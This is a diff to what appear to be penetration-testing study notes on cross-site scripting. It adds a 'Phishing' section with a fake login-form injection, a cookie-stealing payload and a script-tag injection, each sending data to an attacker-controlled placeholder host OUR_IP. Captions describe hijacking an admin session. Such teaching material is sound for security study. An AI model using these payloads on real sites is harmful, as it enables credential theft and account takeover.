@@ -236,7 +236,7 @@ wfuzz -c -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d "form" --hc 404
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of <code>window.origin</code> in the alert box, instead of a static value like <code>1</code>. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption><p>Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of <code>window.origin</code> in the alert box, instead of a static value like <code>1</code>. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.</p></figcaption></figure>
 
 ### XSS Discovery Automation
 
@@ -261,6 +261,42 @@ python xsstrike.py -u "http://SERVER_IP:PORT/somepage.example?example=example"
 {% endcode %}
 
 ### Phishing
+
+### Login Form Injection
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption><p>we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.</p></figcaption></figure>
+
+{% code overflow="wrap" %}
+```
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p>the page should look as follows when we visit the malicious URL</p></figcaption></figure>
+
+### Session Hijacking
+
+{% code overflow="wrap" %}
+```
+new Image().src='http://OUR_IP/?c='+document.cookie
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p>Write this js into a "script.js" file. You will need to serve this in a PHP server.</p></figcaption></figure>
+
+```
+"><script src="http://OUR_IP/script.js"></script>
+```
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>This is one of many payloads. This payload's main purpose is to have the victim's browser to send a request to our malicious PHP server and executing the code that will give us the cookie. </p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>The Victim's activity from the malicious PHP server perspective.</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption><p>Using the cookie editor to place our stolen cookie and then saving the changes</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption><p>Refresh the page and you will be logged in as that user in this case, admin</p></figcaption></figure>
 
 
 
